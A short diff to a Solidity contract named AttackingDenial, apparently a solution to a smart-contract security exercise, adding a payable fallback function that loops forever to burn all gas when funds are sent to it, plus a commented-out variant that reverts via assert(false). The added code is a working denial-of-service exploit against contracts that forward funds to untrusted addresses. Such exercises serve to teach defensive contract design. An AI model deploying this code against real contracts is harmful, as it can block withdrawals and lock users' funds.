@@ -10,4 +10,13 @@ contract AttackingDenial {
     }
 
     //Code me!
+    // allow deposit of funds
+    fallback() external payable {
+        while (true) {}
+    }
+
+    // // allow deposit of funds
+    // receive() external payable {
+    //     assert(false);
+    // }
 }
